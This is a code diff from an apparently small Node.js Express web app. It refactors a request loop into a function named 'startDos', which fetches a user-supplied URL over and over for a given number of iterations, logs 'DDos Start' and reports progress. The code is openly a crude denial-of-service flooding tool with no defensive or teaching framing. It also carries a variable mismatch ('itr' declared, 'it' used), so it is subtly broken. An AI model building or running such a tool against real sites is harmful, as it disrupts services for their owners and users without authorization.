@@ -168,7 +168,35 @@ app.get('/all',function(req,res){
      
 })
 
+var startDos=function(url,loops,res)
+{
 
+    var itr=0;
+var cb=function(url_res,data){
+
+    try{ 
+
+        lg('HTTP response  ' +(url_res.statusCode))
+        lg('HTTP response Size ' +data.length)
+        if(it<loops)
+        {
+            it++;
+            res.write('<br>Iteration : '+it+'/'+loops+' -- '+(100*(it/loops))+' % complete')
+            gethtml(url,cb)
+        }
+        else{
+            res.end()
+        }
+    }catch(e)
+    {
+        lg('Err'+JSON.stringify(e))
+    }
+   
+};
+
+gethtml(url,cb)
+
+}
 
 app.get('/',function(req,res){
 
@@ -187,29 +215,6 @@ app.get('/',function(req,res){
     }
 
 
-var cb=function(res,data){
-
-    try{ }catch(e)
-    {
-        lg('Err'+JSON.stringify(e))
-    }
-
-        lg('HTTP response  ' +(res.statusCode))
-        lg('HTTP response Size ' +data.length)
-        if(it<loops)
-        {
-            it++;
-            res.write('<br>Iteration : '+it+'/'+loops+' -- '+(100*(it/loops))+' % complete')
-            gethtml(url,cb)
-        }
-        else{
-            res.end()
-        }
-        
-   
-};
-
-
 
     lg('DDos Start : '+url+' iterations : '+loops)
     res.write('<head>')
@@ -225,8 +230,7 @@ var cb=function(res,data){
  
      res.write('</h1>')   
 
- 
-    gethtml(url,cb)
+    startDos(url,loops,res)
     
 
     
